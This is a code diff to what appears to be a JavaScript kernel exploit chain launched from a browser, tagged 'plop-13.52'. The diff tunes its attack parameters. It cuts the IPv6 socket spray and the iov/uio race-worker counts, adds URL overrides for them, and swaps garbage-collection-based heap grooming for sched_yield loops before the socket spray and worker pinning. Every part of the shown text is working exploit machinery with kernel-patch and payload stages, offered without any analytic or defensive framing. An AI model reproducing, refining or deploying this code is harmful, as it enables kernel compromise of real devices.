@@ -134,7 +134,9 @@ const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
 const F_SETFL = 4, O_NONBLOCK = 4;
 const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
 const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
-const NUM_IPV6_SOCK_DEFAULT = 0x100;
+const NUM_IPV6_SOCK_DEFAULT = 0x80;
+const NUM_IOV_WORKER_DEFAULT = 3;
+const NUM_UIO_WORKER_DEFAULT = 3;
 
 const RTHDR_TAG = 0x13370000;
 const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;
@@ -157,7 +159,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
+const CHAIN_BUILD = "plop-13.52-2026-03-26-lowfoot";
 
 (async function () {
     let p = null;
@@ -165,7 +167,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
         mark("CHAIN-BUILD", CHAIN_BUILD);
 
         const NUM_IOV_WORKER = params.has("iov")
-            ? parseInt(params.get("iov"), 10) : 4;
+            ? parseInt(params.get("iov"), 10) : NUM_IOV_WORKER_DEFAULT;
         const NUM_ATTEMPT = params.has("attempts")
             ? parseInt(params.get("attempts"), 10) : 8;
         const NUM_IOV_SPRAY = params.has("spray")
@@ -183,9 +185,15 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
             return;
         }
         mark("FW-STATUS", off.fw_status || "none");
-        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
+        const NUM_UIO_PLAN = params.has("uio")
+            ? parseInt(params.get("uio"), 10) : NUM_UIO_WORKER_DEFAULT;
+        const IPV6_PLAN = params.has("ipv6")
+            ? parseInt(params.get("ipv6"), 10) : NUM_IPV6_SOCK_DEFAULT;
+        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " uio_workers=" + NUM_UIO_PLAN
+            + " ipv6=" + IPV6_PLAN + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
-            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
+            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed")
+            + " (full Poops: ?iov=4&uio=4&ipv6=256)");
 
         let kpatch = null, payload = null;
         let kernelBlobsLoaded = false;
@@ -684,9 +692,8 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
             ipv6.length = 0;
             dropGroomFootprint();
             lines.length = 0;
-            // No alloc-based collect here: after 8 workers the heap cannot
-            // spare even 1 MiB temp buffers without OOM (worst_ms ~floor = no GC).
-            await groomCollect(12, 0, 48, "pre-ipv6", () => sc(SYS.sched_yield));
+            if (outEl) outEl.textContent = "";
+            for (let y = 0; y < 4; ++y) sc(SYS.sched_yield);
             let eno = 0;
             for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
                 const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
@@ -696,11 +703,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
                     break;
                 }
                 ipv6.push(s);
-                if ((i & 7) === 7) {
-                    dropGroomFootprint();
-                    await new Promise(r => setTimeout(r, 0));
-                    sc(SYS.sched_yield);
-                }
+                if ((i & 15) === 15) sc(SYS.sched_yield);
                 if ((i & 0x3f) === 0x3f)
                     post("IPV6-OPEN-PROGRESS", i + 1 + "/" + NUM_IPV6_SOCK);
             }
@@ -739,7 +742,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
 
         const NUM_UIO_WORKER = params.has("uio")
-            ? parseInt(params.get("uio"), 10) : 4;
+            ? parseInt(params.get("uio"), 10) : NUM_UIO_WORKER_DEFAULT;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
 
         const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
@@ -909,7 +912,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-nocollect-ipv6";
         mark("WORKER-POOLS", "iov=" + iovWorkers.length
             + " uio=" + uioWorkers.length);
         dropGroomFootprint();
-        await groomCollect(8, 0, 45, "pre-worker-pin", () => sc(SYS.sched_yield));
+        for (let y = 0; y < 6; ++y) sc(SYS.sched_yield);
         for (const w of workers) {
             sc(SYS.sched_yield);
             await pinWorkerRealtime(w);
